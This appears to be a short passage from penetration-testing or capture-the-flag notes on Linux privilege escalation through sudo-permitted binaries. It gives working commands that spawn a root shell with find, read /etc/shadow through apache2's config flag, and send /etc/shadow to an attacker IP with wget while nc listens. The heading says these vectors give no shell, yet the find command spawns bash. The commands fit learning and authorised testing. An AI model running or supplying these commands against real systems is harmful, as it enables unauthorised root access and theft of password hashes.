Read files as root. These vectors won't produce a shell but you can read root files as root.
#### find
```bash
sudo find . -exec /bin/bash \; -quit
```
#### Apache
Sometimes, you will have a program that shows up in the enum that does not show up as exploitable in GFTOBins, but that doesn't mean it isn't possible to abuse, in this case you can put in the software into google: `apache privesc exploit`
This may come up with something like the following with a way it can be abused to privesc, in this case you get a file read on a file we shouldn't be able to read:
```bash
sudo apache2 -f /etc/shadow
```
#### wget
Similarly to above, you may not see wget in GTFOBins directly, but you can use it to get file access to files locked to root, so you can abuse wget to send yourself a file (like `/etc/shadow`) that you should not have access to:
```bash
# on attack box
nc -nvlp <listening port>
nc -nvlp 8001

# on target
sudo wget --post-file=<file path> <attack ip>:<listening port>
sudo wget --post-file=/etc/shadow 10.10.10.10:8001
```
